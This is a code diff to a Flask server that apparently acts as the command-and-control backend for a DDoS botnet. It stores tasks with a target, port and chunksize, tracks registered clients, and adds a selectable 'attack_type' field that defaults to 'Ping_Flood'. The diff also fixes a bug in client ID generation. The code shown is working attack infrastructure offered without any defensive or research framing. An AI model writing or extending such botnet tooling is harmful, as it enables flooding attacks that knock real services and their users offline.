@@ -35,14 +35,16 @@ class Task(db.Model):
     port = db.Column(db.Integer)
     chunksize = db.Column(db.Integer)
     active = db.Column(db.Integer)
+    attack_type = db.Column(db.String)
 
-    def __init__(self, uid, name, target, port, chunksize, active):
+    def __init__(self, uid, name, target, port, chunksize, active, attack_type):
         self.uid = uid
         self.name = name
         self.target = target
         self.port = port
         self.chunksize = chunksize
         self.active = active
+        self.attack_type = attack_type
 
 
 class Client(db.Model):
@@ -85,7 +87,7 @@ def all_clients():
 
         # Create uuid
         uid = randint(0, 999999999)
-        while not is_client_key_unique(id):
+        while not is_client_key_unique(uid):
             uid = randint(0, 999999999)
 
         # Create last_online date
@@ -118,6 +120,20 @@ def all_tasks():
         port = request.args.get('port')
         chunksize = request.args.get('chunksize')
         active = request.args.get('active')
+        attack_type = request.args.get('attack_type')
+
+        if not name:
+            name = "N/A"
+        if not target:
+            target = "127.0.0.1"
+        if not port:
+            port = 53
+        if not chunksize:
+            chunksize = 1000
+        if not active:
+            active = 0
+        if not attack_type:
+            attack_type = "Ping_Flood"
 
         # Create uuid
         uid = randint(0, 999999999)
@@ -130,7 +146,8 @@ def all_tasks():
                         target=target,
                         port=port,
                         chunksize=chunksize,
-                        active=active)
+                        active=active,
+                        attack_type=attack_type)
         db.session.add(new_task)
         db.session.flush()
         db.session.commit()
@@ -161,6 +178,8 @@ def singular_task(uid):
             task.chunksize = request.args.get('chunksize')
         if request.args.get('active'):
             task.active = request.args.get('active')
+        if request.args.get('attack_type'):
+            task.attack_type = request.args.get('attack_type')
 
         # Perform update
         db.session.flush()
@@ -290,6 +309,7 @@ def return_task_json(task):
         'port': task.port,
         'chunksize': task.chunksize,
         'active': task.active,
+        'attack_type': task.attack_type,
     }
 
 
